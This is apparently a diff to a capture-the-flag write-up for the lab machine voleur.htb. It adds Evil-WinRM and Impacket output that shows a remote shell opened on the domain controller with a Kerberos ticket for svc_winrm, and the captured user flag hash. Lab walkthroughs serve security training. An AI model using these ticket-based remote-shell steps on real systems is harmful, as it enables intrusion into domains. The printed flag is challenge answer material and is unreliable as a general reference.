@@ -402,13 +402,79 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 export KRB5CCNAME=svc_winrm.ccache
 ```
 
+```
+evil-winrm -i DC.voleur.htb -r voleur.htb
+2026-10-06 02:04:38.751311 (-0400) +28853.996590 +/- 0.014309 DC.voleur.htb 10.129.232.130 s1 no-leap
+CLOCK: time stepped by 28853.996590
+Tue Oct  6 02:04:38 AM EDT 2026
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache
+Ticket cache: FILE:svc_winrm.ccache
+Default principal: svc_winrm@VOLEUR.HTB
+
+Valid starting       Expires              Service principal
+10/06/2026 02:04:42  10/06/2026 12:04:42  krbtgt/VOLEUR.HTB@VOLEUR.HTB
+        renew until 10/07/2026 02:04:42
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
+
+```
+
 ---
 ## User Flag
 
-### Lateral Movement (if applicable)
 
-Steps to move from initial foothold to user access.
+```
+*Evil-WinRM* PS C:\Users\svc_winrm> ls
 
+
+    Directory: C:\Users\svc_winrm
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         1/29/2025   7:07 AM                3D Objects
+d-r---         1/29/2025   7:07 AM                Contacts
+d-r---         1/31/2025   1:55 AM                Desktop
+d-r---         1/29/2025   7:07 AM                Documents
+d-r---         1/29/2025   7:07 AM                Downloads
+d-r---         1/29/2025   7:07 AM                Favorites
+d-r---         1/29/2025   7:07 AM                Links
+d-r---         1/29/2025   7:07 AM                Music
+d-r---         1/29/2025   7:07 AM                Pictures
+d-r---         1/29/2025   7:07 AM                Saved Games
+d-r---         1/29/2025   7:07 AM                Searches
+d-r---         1/29/2025   7:07 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
+*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls
+
+
+    Directory: C:\Users\svc_winrm\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
+-ar---         10/5/2026   7:38 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
+131305f89e46111ca31de2ad19bd707d
+*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> 
+
+```
+
+### Lateral Movement
 ---
 ## Privilege Escalation
 
